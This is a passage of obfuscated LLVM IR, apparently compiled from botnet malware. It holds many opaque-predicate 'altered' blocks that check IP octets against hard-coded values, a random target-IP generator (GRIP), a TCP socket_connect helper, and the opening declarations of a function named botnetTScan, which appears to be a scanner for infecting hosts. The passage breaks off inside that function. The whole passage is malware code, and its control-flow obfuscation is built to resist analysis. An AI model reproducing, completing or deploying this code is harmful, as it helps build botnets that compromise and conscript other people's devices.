originalBB400alteredBB:                           ; preds = %originalBB400, %2834
  %5324 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5325 = zext i8 %5324 to i32
  %5326 = icmp slt i32 %5325, 223
  br label %originalBB400

originalBB404alteredBB:                           ; preds = %originalBB404, %2854
  %5327 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5328 = zext i8 %5327 to i32
  %5329 = icmp eq i32 %5328, 104
  br label %originalBB404

originalBB408alteredBB:                           ; preds = %originalBB408, %2890
  %5330 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5331 = zext i8 %5330 to i32
  %5332 = icmp eq i32 %5331, 222
  br label %originalBB408

originalBB412alteredBB:                           ; preds = %originalBB412, %2910
  %5333 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5334 = zext i8 %5333 to i32
  %5335 = icmp sge i32 %5334, 1
  br label %originalBB412

originalBB416alteredBB:                           ; preds = %originalBB416, %2938
  %5336 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5337 = zext i8 %5336 to i32
  %5338 = icmp eq i32 %5337, 167
  br label %originalBB416

originalBB420alteredBB:                           ; preds = %originalBB420, %2958
  %5339 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5340 = zext i8 %5339 to i32
  %5341 = icmp sge i32 %5340, 232
  br label %originalBB420

originalBB424alteredBB:                           ; preds = %originalBB424, %2978
  %5342 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5343 = zext i8 %5342 to i32
  %5344 = icmp slt i32 %5343, 252
  br label %originalBB424

originalBB428alteredBB:                           ; preds = %originalBB428, %3018
  %5345 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5346 = zext i8 %5345 to i32
  %5347 = icmp eq i32 %5346, 63
  br label %originalBB428

originalBB432alteredBB:                           ; preds = %originalBB432, %3050
  %5348 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5349 = zext i8 %5348 to i32
  %5350 = icmp eq i32 %5349, 237
  br label %originalBB432

originalBB436alteredBB:                           ; preds = %originalBB436, %3110
  %5351 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5352 = zext i8 %5351 to i32
  %5353 = icmp eq i32 %5352, 185
  br label %originalBB436

originalBB440alteredBB:                           ; preds = %originalBB440, %3190
  %5354 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5355 = zext i8 %5354 to i32
  %5356 = icmp eq i32 %5355, 66
  br label %originalBB440

originalBB444alteredBB:                           ; preds = %originalBB444, %3238
  %5357 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5358 = zext i8 %5357 to i32
  %5359 = icmp eq i32 %5358, 63
  br label %originalBB444

originalBB448alteredBB:                           ; preds = %originalBB448, %3258
  %5360 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5361 = zext i8 %5360 to i32
  %5362 = icmp eq i32 %5361, 251
  br label %originalBB448

originalBB452alteredBB:                           ; preds = %originalBB452, %3278
  %5363 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5364 = zext i8 %5363 to i32
  %5365 = icmp sge i32 %5364, 19
  br label %originalBB452

originalBB456alteredBB:                           ; preds = %originalBB456, %3298
  %5366 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5367 = zext i8 %5366 to i32
  %5368 = icmp slt i32 %5367, 21
  br label %originalBB456

originalBB460alteredBB:                           ; preds = %originalBB460, %3326
  %5369 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5370 = zext i8 %5369 to i32
  %5371 = icmp sge i32 %5370, 73
  br label %originalBB460

originalBB464alteredBB:                           ; preds = %originalBB464, %3354
  %5372 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5373 = zext i8 %5372 to i32
  %5374 = icmp eq i32 %5373, 91
  br label %originalBB464

originalBB468alteredBB:                           ; preds = %originalBB468, %3378
  %5375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5376 = zext i8 %5375 to i32
  %5377 = icmp slt i32 %5376, 115
  br label %originalBB468

originalBB472alteredBB:                           ; preds = %originalBB472, %3398
  %5378 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5379 = zext i8 %5378 to i32
  %5380 = icmp eq i32 %5379, 74
  br label %originalBB472

originalBB476alteredBB:                           ; preds = %originalBB476, %3418
  %5381 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5382 = zext i8 %5381 to i32
  %5383 = icmp eq i32 %5382, 201
  br label %originalBB476

originalBB480alteredBB:                           ; preds = %originalBB480, %3482
  %5384 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5385 = zext i8 %5384 to i32
  %5386 = icmp eq i32 %5385, 80
  br label %originalBB480

originalBB484alteredBB:                           ; preds = %originalBB484, %3502
  %5387 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5388 = zext i8 %5387 to i32
  %5389 = icmp eq i32 %5388, 164
  br label %originalBB484

originalBB488alteredBB:                           ; preds = %originalBB488, %3562
  %5390 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5391 = zext i8 %5390 to i32
  %5392 = icmp eq i32 %5391, 59
  br label %originalBB488

originalBB492alteredBB:                           ; preds = %originalBB492, %3582
  %5393 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5394 = zext i8 %5393 to i32
  %5395 = icmp eq i32 %5394, 37
  br label %originalBB492

originalBB496alteredBB:                           ; preds = %originalBB496, %3602
  %5396 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5397 = zext i8 %5396 to i32
  %5398 = icmp eq i32 %5397, 187
  br label %originalBB496

originalBB500alteredBB:                           ; preds = %originalBB500, %3622
  %5399 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5400 = zext i8 %5399 to i32
  %5401 = icmp eq i32 %5400, 46
  br label %originalBB500

originalBB504alteredBB:                           ; preds = %originalBB504, %3646
  %5402 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5403 = zext i8 %5402 to i32
  %5404 = icmp eq i32 %5403, 51
  br label %originalBB504

originalBB508alteredBB:                           ; preds = %originalBB508, %3674
  %5405 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5406 = zext i8 %5405 to i32
  %5407 = icmp eq i32 %5406, 255
  br label %originalBB508

originalBB512alteredBB:                           ; preds = %originalBB512, %3698
  %5408 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5409 = zext i8 %5408 to i32
  %5410 = icmp eq i32 %5409, 135
  br label %originalBB512

originalBB516alteredBB:                           ; preds = %originalBB516, %3722
  %5411 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5412 = zext i8 %5411 to i32
  %5413 = icmp eq i32 %5412, 196
  br label %originalBB516

originalBB520alteredBB:                           ; preds = %originalBB520, %3758
  %5414 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5415 = zext i8 %5414 to i32
  %5416 = icmp eq i32 %5415, 104
  br label %originalBB520

originalBB524alteredBB:                           ; preds = %originalBB524, %3802
  %5417 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5418 = zext i8 %5417 to i32
  %5419 = icmp slt i32 %5418, 111
  br label %originalBB524

originalBB528alteredBB:                           ; preds = %originalBB528, %3850
  %5420 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5421 = zext i8 %5420 to i32
  %5422 = icmp slt i32 %5421, 95
  br label %originalBB528

originalBB532alteredBB:                           ; preds = %originalBB532, %3874
  %5423 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5424 = zext i8 %5423 to i32
  %5425 = icmp eq i32 %5424, 170
  br label %originalBB532

originalBB536alteredBB:                           ; preds = %originalBB536, %3898
  %5426 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5427 = zext i8 %5426 to i32
  %5428 = icmp slt i32 %5427, 255
  br label %originalBB536

originalBB540alteredBB:                           ; preds = %originalBB540, %3918
  %5429 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5430 = zext i8 %5429 to i32
  %5431 = icmp eq i32 %5430, 192
  br label %originalBB540

originalBB544alteredBB:                           ; preds = %originalBB544, %3938
  %5432 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5433 = zext i8 %5432 to i32
  %5434 = icmp eq i32 %5433, 111
  br label %originalBB544

originalBB548alteredBB:                           ; preds = %originalBB548, %3966
  %5435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5436 = zext i8 %5435 to i32
  %5437 = icmp eq i32 %5436, 192
  br label %originalBB548

originalBB552alteredBB:                           ; preds = %originalBB552, %3986
  %5438 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5439 = zext i8 %5438 to i32
  %5440 = icmp eq i32 %5439, 252
  br label %originalBB552

originalBB556alteredBB:                           ; preds = %originalBB556, %4006
  %5441 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5442 = zext i8 %5441 to i32
  %5443 = icmp sge i32 %5442, 208
  br label %originalBB556

originalBB560alteredBB:                           ; preds = %originalBB560, %4038
  %5444 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5445 = zext i8 %5444 to i32
  %5446 = icmp sge i32 %5445, 56
  br label %originalBB560

originalBB564alteredBB:                           ; preds = %originalBB564, %4082
  %5447 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5448 = zext i8 %5447 to i32
  %5449 = icmp eq i32 %5448, 116
  br label %originalBB564

originalBB568alteredBB:                           ; preds = %originalBB568, %4114
  %5450 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5451 = zext i8 %5450 to i32
  %5452 = icmp eq i32 %5451, 229
  br label %originalBB568

originalBB572alteredBB:                           ; preds = %originalBB572, %4154
  %5453 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5454 = zext i8 %5453 to i32
  %5455 = icmp slt i32 %5454, 223
  br label %originalBB572

originalBB576alteredBB:                           ; preds = %originalBB576, %4186
  %5456 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5457 = zext i8 %5456 to i32
  %5458 = icmp slt i32 %5457, 187
  br label %originalBB576

originalBB580alteredBB:                           ; preds = %originalBB580, %4210
  %5459 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5460 = zext i8 %5459 to i32
  %5461 = icmp eq i32 %5460, 220
  br label %originalBB580

originalBB584alteredBB:                           ; preds = %originalBB584, %4238
  %5462 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5463 = zext i8 %5462 to i32
  %5464 = icmp eq i32 %5463, 208
  br label %originalBB584

originalBB588alteredBB:                           ; preds = %originalBB588, %4258
  %5465 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5466 = zext i8 %5465 to i32
  %5467 = icmp eq i32 %5466, 78
  br label %originalBB588

originalBB592alteredBB:                           ; preds = %originalBB592, %4282
  %5468 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5469 = zext i8 %5468 to i32
  %5470 = icmp slt i32 %5469, 43
  br label %originalBB592

originalBB596alteredBB:                           ; preds = %originalBB596, %4322
  %5471 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5472 = zext i8 %5471 to i32
  %5473 = icmp eq i32 %5472, 71
  br label %originalBB596

originalBB600alteredBB:                           ; preds = %originalBB600, %4350
  %5474 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5475 = zext i8 %5474 to i32
  %5476 = icmp eq i32 %5475, 98
  br label %originalBB600

originalBB604alteredBB:                           ; preds = %originalBB604, %4378
  %5477 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5478 = zext i8 %5477 to i32
  %5479 = icmp slt i32 %5478, 223
  br label %originalBB604

originalBB608alteredBB:                           ; preds = %originalBB608, %4450
  %5480 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5481 = zext i8 %5480 to i32
  %5482 = icmp sge i32 %5481, 64
  br label %originalBB608

originalBB612alteredBB:                           ; preds = %originalBB612, %4470
  %5483 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5484 = zext i8 %5483 to i32
  %5485 = icmp slt i32 %5484, 95
  br label %originalBB612

originalBB616alteredBB:                           ; preds = %originalBB616, %4498
  %5486 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5487 = zext i8 %5486 to i32
  %5488 = icmp slt i32 %5487, 255
  br label %originalBB616

originalBB620alteredBB:                           ; preds = %originalBB620, %4550
  %5489 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5490 = zext i8 %5489 to i32
  %5491 = icmp eq i32 %5490, 51
  br label %originalBB620

originalBB624alteredBB:                           ; preds = %originalBB624, %4574
  %5492 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5493 = zext i8 %5492 to i32
  %5494 = icmp slt i32 %5493, 255
  br label %originalBB624

originalBB628alteredBB:                           ; preds = %originalBB628, %4622
  %5495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5496 = zext i8 %5495 to i32
  %5497 = icmp slt i32 %5496, 255
  br label %originalBB628

originalBB632alteredBB:                           ; preds = %originalBB632, %4654
  %5498 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5499 = zext i8 %5498 to i32
  %5500 = icmp slt i32 %5499, 97
  br label %originalBB632

originalBB636alteredBB:                           ; preds = %originalBB636, %4690
  %5501 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5502 = zext i8 %5501 to i32
  %5503 = icmp sge i32 %5502, 94
  br label %originalBB636

originalBB640alteredBB:                           ; preds = %originalBB640, %4734
  %5504 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5505 = zext i8 %5504 to i32
  %5506 = icmp slt i32 %5505, 189
  br label %originalBB640

originalBB644alteredBB:                           ; preds = %originalBB644, %4758
  %5507 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5508 = zext i8 %5507 to i32
  %5509 = icmp sge i32 %5508, 184
  br label %originalBB644

originalBB648alteredBB:                           ; preds = %originalBB648, %4782
  %5510 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5511 = zext i8 %5510 to i32
  %5512 = icmp eq i32 %5511, 105
  br label %originalBB648

originalBB652alteredBB:                           ; preds = %originalBB652, %4826
  %5513 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5514 = zext i8 %5513 to i32
  %5515 = icmp eq i32 %5514, 86
  br label %originalBB652

originalBB656alteredBB:                           ; preds = %originalBB656, %4850
  %5516 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5517 = zext i8 %5516 to i32
  %5518 = icmp eq i32 %5517, 86
  br label %originalBB656

originalBB660alteredBB:                           ; preds = %originalBB660, %4870
  %5519 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5520 = zext i8 %5519 to i32
  %5521 = icmp eq i32 %5520, 209
  br label %originalBB660

originalBB664alteredBB:                           ; preds = %originalBB664, %4890
  %5522 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5523 = zext i8 %5522 to i32
  %5524 = icmp eq i32 %5523, 193
  br label %originalBB664

originalBB668alteredBB:                           ; preds = %originalBB668, %4910
  %5525 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5526 = zext i8 %5525 to i32
  %5527 = icmp eq i32 %5526, 164
  br label %originalBB668

originalBB672alteredBB:                           ; preds = %originalBB672, %4942
  %5528 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5529 = zext i8 %5528 to i32
  %5530 = icmp eq i32 %5529, 188
  br label %originalBB672

originalBB676alteredBB:                           ; preds = %originalBB676, %4974
  %5531 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5532 = zext i8 %5531 to i32
  %5533 = icmp eq i32 %5532, 224
  br label %originalBB676
}

; Function Attrs: nounwind
declare i32 @rand() #1

; Function Attrs: noinline nounwind uwtable
define i32 @GRIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #6

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %109

; <label>:14:                                     ; preds = %2
  %15 = load i32, i32* @x.73
  %16 = load i32, i32* @y.74
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load %struct.hostent*, %struct.hostent** %6, align 8
  %24 = getelementptr inbounds %struct.hostent, %struct.hostent* %23, i32 0, i32 4
  %25 = load i8**, i8*** %24, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %29 = bitcast %struct.in_addr* %28 to i8*
  %30 = load %struct.hostent*, %struct.hostent** %6, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 3
  %32 = load i32, i32* %31, align 4
  %33 = sext i32 %32 to i64
  call void @bcopy(i8* %27, i8* %29, i64 %33) #3
  %34 = load i16, i16* %5, align 2
  %35 = call zeroext i16 @htons(i16 zeroext %34) #10
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %37, align 4
  %38 = call i32 @socket(i32 2, i32 1, i32 6) #3
  store i32 %38, i32* %9, align 4
  %39 = load i32, i32* %9, align 4
  %40 = bitcast i32* %8 to i8*
  %41 = call i32 @setsockopt(i32 %39, i32 6, i32 1, i8* %40, i32 4) #3
  %42 = load i32, i32* %9, align 4
  %43 = icmp eq i32 %42, -1
  %44 = load i32, i32* @x.73
  %45 = load i32, i32* @y.74
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %69

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i32, i32* @x.73
  %54 = load i32, i32* @y.74
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  store i32 0, i32* %3, align 4
  %61 = load i32, i32* @x.73
  %62 = load i32, i32* @y.74
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %109

; <label>:69:                                     ; preds = %originalBBpart2
  %70 = load i32, i32* %9, align 4
  %71 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %72 = call i32 @connect(i32 %70, %struct.sockaddr* %71, i32 16)
  %73 = icmp eq i32 %72, -1
  br i1 %73, label %74, label %91

; <label>:74:                                     ; preds = %69
  %75 = load i32, i32* @x.73
  %76 = load i32, i32* @y.74
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %74
  store i32 0, i32* %3, align 4
  %83 = load i32, i32* @x.73
  %84 = load i32, i32* @y.74
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %109

; <label>:91:                                     ; preds = %69
  %92 = load i32, i32* @x.73
  %93 = load i32, i32* @y.74
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %91
  %100 = load i32, i32* %9, align 4
  store i32 %100, i32* %3, align 4
  %101 = load i32, i32* @x.73
  %102 = load i32, i32* @y.74
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %109

; <label>:109:                                    ; preds = %originalBBpart212, %originalBBpart28, %originalBBpart24, %13
  %110 = load i32, i32* @x.73
  %111 = load i32, i32* @y.74
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %109
  %118 = load i32, i32* %3, align 4
  %119 = load i32, i32* @x.73
  %120 = load i32, i32* @y.74
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  ret i32 %118

originalBBalteredBB:                              ; preds = %originalBB, %14
  %127 = load %struct.hostent*, %struct.hostent** %6, align 8
  %128 = getelementptr inbounds %struct.hostent, %struct.hostent* %127, i32 0, i32 4
  %129 = load i8**, i8*** %128, align 8
  %130 = getelementptr inbounds i8*, i8** %129, i64 0
  %131 = load i8*, i8** %130, align 8
  %132 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %133 = bitcast %struct.in_addr* %132 to i8*
  %134 = load %struct.hostent*, %struct.hostent** %6, align 8
  %135 = getelementptr inbounds %struct.hostent, %struct.hostent* %134, i32 0, i32 3
  %136 = load i32, i32* %135, align 4
  %137 = sext i32 %136 to i64
  call void @bcopy(i8* %131, i8* %133, i64 %137) #3
  %138 = load i16, i16* %5, align 2
  %139 = call zeroext i16 @htons(i16 zeroext %138) #10
  %140 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %139, i16* %140, align 2
  %141 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %141, align 4
  %142 = call i32 @socket(i32 2, i32 1, i32 6) #3
  store i32 %142, i32* %9, align 4
  %143 = load i32, i32* %9, align 4
  %144 = bitcast i32* %8 to i8*
  %145 = call i32 @setsockopt(i32 %143, i32 6, i32 1, i8* %144, i32 4) #3
  %146 = load i32, i32* %9, align 4
  %147 = icmp eq i32 %146, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  store i32 0, i32* %3, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %74
  store i32 0, i32* %3, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %91
  %148 = load i32, i32* %9, align 4
  store i32 %148, i32* %3, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %109
  %149 = load i32, i32* %3, align 4
  br label %originalBB14
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @botnetTScan(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [128 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
